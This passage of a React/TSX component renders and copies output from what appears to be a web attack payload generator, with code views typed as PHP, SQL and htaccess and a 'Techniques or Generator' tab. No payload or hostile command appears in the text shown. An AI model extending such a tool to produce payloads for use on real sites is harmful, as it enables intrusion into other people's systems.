                  <p className="text-xs mt-1">Use the Techniques or Generator tab to create payloads</p>
                </div>
              ) : (
                <div className="space-y-4">
                  {/* Show all string/preview fields */}
                  {Object.entries(generatedPayload).map(([key, value]) => {
                    if (key === "fullPayload" || key === "generatedAt") return null;
                    if (typeof value === "string" && value.length > 50) {
                      return (
                        <div key={key}>
                          <div className="flex items-center justify-between mb-1">
                            <Label className="text-xs text-gray-400">{key.replace(/([A-Z])/g, " $1").replace(/^./, s => s.toUpperCase())}</Label>
                            <Button size="sm" variant="ghost" onClick={() => copyToClipboard(value)} className="h-5 px-1">
                              <Copy className="h-3 w-3 text-gray-400" />
                            </Button>
                          </div>
                          <CodeViewer code={value} language={key.includes("sql") || key.includes("Sql") ? "sql" : key.includes("htaccess") || key.includes("nginx") ? "apache" : "php"} maxHeight="200px" />
                        </div>
                      );
                    }
                    if (typeof value === "number" || typeof value === "boolean") {
                      return (
                        <div key={key} className="flex items-center justify-between py-1 border-b border-gray-800/50">
                          <span className="text-xs text-gray-400">{key.replace(/([A-Z])/g, " $1").replace(/^./, s => s.toUpperCase())}</span>
                          <span className="text-xs text-white font-medium">
                            {typeof value === "boolean" ? (value ? <CheckCircle2 className="h-3 w-3 text-green-400 inline" /> : <XCircle className="h-3 w-3 text-red-400 inline" />) : value}
                          </span>
                        </div>
                      );
                    }
                    if (Array.isArray(value) && value.length > 0 && typeof value[0] === "object") {
                      return (
                        <div key={key}>
                          <Label className="text-xs text-gray-400 mb-1 block">{key} ({value.length} items)</Label>
                          <ScrollArea className="max-h-[200px]">
                            <div className="space-y-1">
                              {value.slice(0, 10).map((item: any, idx: number) => (
                                <div key={idx} className="p-2 rounded bg-gray-800/50 border border-gray-800 text-[10px] font-mono text-gray-400">
                                  {JSON.stringify(item, null, 0).slice(0, 200)}
                                </div>
                              ))}
                              {value.length > 10 && <p className="text-[10px] text-gray-500 text-center">... and {value.length - 10} more</p>}
                            </div>
                          </ScrollArea>
                        </div>
                      );
                    }
                    return null;
                  })}

                  {/* Full JSON Export */}
                  <div className="border-t border-gray-800 pt-3">
                    <div className="flex items-center justify-between mb-1">
                      <Label className="text-xs text-gray-400">Full Payload JSON</Label>
                      <Button size="sm" variant="ghost" onClick={() => copyToClipboard(JSON.stringify(generatedPayload.fullPayload || generatedPayload, null, 2))} className="h-5 px-1">
                        <Copy className="h-3 w-3 text-gray-400 mr-1" /> <span className="text-[10px]">Copy Full JSON</span>
                      </Button>
                    </div>
                    <CodeViewer code={JSON.stringify(generatedPayload.fullPayload || generatedPayload, null, 2).slice(0, 3000) + "\n..."} language="json" maxHeight="300px" />
                  </div>
                </div>
              )}
            </CardContent>
          </Card>
        </TabsContent>
      </Tabs>
    </div>
  );
}
